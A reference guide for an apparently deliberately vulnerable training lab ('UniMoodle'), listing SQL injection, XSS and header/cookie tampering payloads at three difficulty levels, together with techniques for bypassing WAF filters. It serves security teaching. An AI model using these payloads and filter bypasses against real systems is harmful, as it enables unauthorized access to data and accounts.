SECURITY LAB REFERENCE GUIDE

💡 Hints, One-Click Payloads & WAF Explanations

Unified exploit reference for all 3 UniMoodle modules (Gradebook SQLi, Course Forum XSS, and Dean's Office Burp Tampering) across Low, Medium, and High difficulties.

1. 📊 Gradebook Lookup — SQL Injection (GET /sqli)

WAF Rules: WAF-SQLI-BASIC (L1) | WAF-SQLI-BYPASS (L2)
Low: No filter. | Medium: Blocks spaces (' ') → bypassed with /**/. | High: Blocks spaces, /**/, --, and OR → bypassed with quote-delimited admin'AND'1'='1!
0. Benign Input: alice 1. Launch Low: ' OR '1'='1 2. Launch Medium: admin'/**/oR/**/1=1-- 3. Launch High: admin'AND'1'='1
1. LOW: BOOLEAN TAUTOLOGY Blocked by WAF L1
' OR '1'='1

What it does: Closes the opening quote in WHERE username = '...' and appends OR '1'='1'.

Why it works: Returns all rows in the grades table including the hidden admin exam key.

2. MEDIUM: COMMENT WHITESPACE Bypasses WAF L1
admin'/**/oR/**/1=1--

What it does: Replaces spaces with inline SQL comments (/**/) and truncates the query with --.

Why it works: Both Medium and WAF L1 expect standard spaces (' ') around SQL keywords.

3. HIGH: QUOTE-DELIMITED LOGIC Bypasses WAF L1
admin'AND'1'='1

What it does: Uses single quotes (') as token boundaries around AND without any spaces, comments, or OR.

Why it works: High strips spaces, /**/, --, and OR, but SQLite parses 'admin'AND'1'='1' as valid boolean truth!

🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-SQLI-BASIC):
Blocked by L1 (403): ' OR 1=1 -- | ' UNION SELECT 1,2,3,4,5 -- • Bypasses L1 (Caught only by L2): admin'/**/oR/**/1=1-- | admin'AND'1'='1

2. 💬 Course Forum — Cross-Site Scripting (GET & POST /xss)

WAF Rules: WAF-XSS-BASIC (L1) | WAF-XSS-BYPASS (L2)
Low: No escaping. | Medium: Strips <script> tags → bypassed with <img onerror=...>. | High: Blocks <script>, <img>, onerror, onload → bypassed with HTML5 <details open ontoggle=...>!
1. Launch Low: <script>alert('XSS-Low')</script> 2. Launch Medium: <img src=x onerror=alert('XSS-Medium')> 3. Launch High: <details open ontoggle=alert('XSS-High-Bypass')>High</details>
1. LOW: DIRECT SCRIPT TAG Blocked by WAF L1
<script>alert('XSS-Low')</script>

What it does: Injects a direct <script> block into the forum search or comment feed.

Why it works: Low performs zero sanitization. Caught by WAF-XSS-BASIC (L1).

2. MEDIUM: EVENT ATTRIBUTE Bypasses WAF L1
<img src=x onerror=alert('XSS-Medium')>

What it does: Triggers JavaScript via an image load error event instead of a <script> element.

Why it works: Medium only removes <script> tags, and WAF L1 does not inspect event attributes.

3. HIGH: HTML5 ONTOGGLE Bypasses WAF L1
<details open ontoggle=alert('XSS-High-Bypass')>High</details>

What it does: Uses an auto-opening HTML5 <details open> element with ontoggle.

Why it works: High blocks <script>, <img>, onerror, and onload, overlooking <details ontoggle>!

🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-XSS-BASIC):
Blocked by L1 (403): <script>alert(1)</script> | <iframe src=javascript:alert(1)> • Bypasses L1 (Caught only by L2): <img src=x onerror=alert(1)> | <details open ontoggle=alert(1)>

3. 🏛️ Dean's Office Override — Burp Suite Tampering (POST /vault)

WAF Rules: WAF-BAC-BASIC (L1) | WAF-BAC-BYPASS (L2)
Low: Trusts is_admin=true or Cookie: user_role=admin. | Medium: Checks Base64 cookie auth_token=dXNlcj1hZG1pbg== + X-Forwarded-For: 127.0.0.1. | High: Checks unsalted SHA-256 vault_sig + X-Original-URL: /admin/vault!
1. LOW: FORM / COOKIE TAMPER Blocked by WAF L1 
Cookie: user_role=admin
is_admin=true

What it does: Modifies is_admin=true in the POST body or sets Cookie: user_role=admin in Burp Proxy.

Why it works: Low trusts unverified client parameters. Caught by WAF-BAC-BASIC (L1).

2. MEDIUM: BASE64 + XFF HEADER Bypasses WAF L1 
X-Forwarded-For: 127.0.0.1
Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==

is_admin=false

What it does: Base64-encodes user=admin (dXNlcj1hZG1pbg==) and adds X-Forwarded-For: 127.0.0.1.

Why it works: WAF L1 does not decode Base64 cookies or inspect proxy headers!

3. HIGH: SHA-256 FORGERY Bypasses WAF L1 
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin/vault
Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig={{ admin_unsalted_sha256 }}

is_admin=false

What it does: Forges unsalted sha256("user=admin") in vault_sig + X-Original-URL: /admin/vault.

Why it works: Unsalted SHA-256 without a secret HMAC key can be computed by any attacker. Caught only by WAF L2!

🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-BAC-BASIC):
Blocked by L1 (403): is_admin=true | Cookie: user_role=admin • Bypasses L1 (Caught only by L2): auth_token=dXNlcj1hZG1pbg== + X-Forwarded-For: 127.0.0.1 + X-Original-URL: /admin/vault
